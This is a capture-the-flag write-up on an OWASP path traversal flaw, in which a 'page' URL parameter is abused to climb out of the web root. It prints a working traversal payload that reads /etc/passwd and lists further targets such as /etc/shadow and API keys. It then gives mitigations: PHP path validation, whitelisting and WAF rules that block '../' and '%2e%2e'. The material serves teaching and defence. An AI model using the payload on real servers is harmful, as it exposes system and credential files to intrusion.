# A5 - Path Traversal (Directory Traversal)

OWASP Top 10 (2017) vulnerability, classified under A5: Broken Access Control. The `page` URL parameter loads files directly from the server without validating the path, allowing escape from the intended directory with `../` sequences.

---

## Steps to Obtain the Flag

### 1. Identify the Vector

The `page` parameter loads resources from the server:
```
http://<IP>/?page=<path>
```

### 2. Exploit

Use repeated `../` to reach the system root and access sensitive files:
```
http://<IP>/?page=../../../../../../../etc/passwd
```

Each `../` moves up one level in the directory hierarchy:
```
/var/www/html/ → /var/www/ → /var/ → / → /etc/passwd
```

The server loads the requested file without validating the path and returns the **flag**.

---

## Impact

- **Information Disclosure:** reading `/etc/passwd`, `/etc/shadow`, configuration files, API keys.
- **Access Control Bypass:** evade restrictions on which files the user can access.
- **System Reconnaissance:** mapping directory structure.
- **Privilege Escalation:** useful information to prepare subsequent attacks.

---

## Mitigation

1. **Validate and Sanitize Paths on Server:**
   ```php
   $page = basename($_GET['page']);
   $safe_path = realpath('./pages/' . $page . '.php');
   if (strpos($safe_path, realpath('./pages/')) !== 0) die('Access denied');
   include($safe_path);
   ```
2. **Whitelist of Allowed Pages:** accept only known identifiers, never free paths.
3. **Block Dangerous Characters:** reject `..`, `/`, and `\` in the parameter.
4. **Configure `open_basedir` in PHP** to limit access to a specific directory.
5. **Restrictive Filesystem Permissions:** sensitive files outside webroot and unreadable by web process.
6. **WAF:** rules to block `../`, `%2e%2e`, and access to paths like `/etc/passwd`.
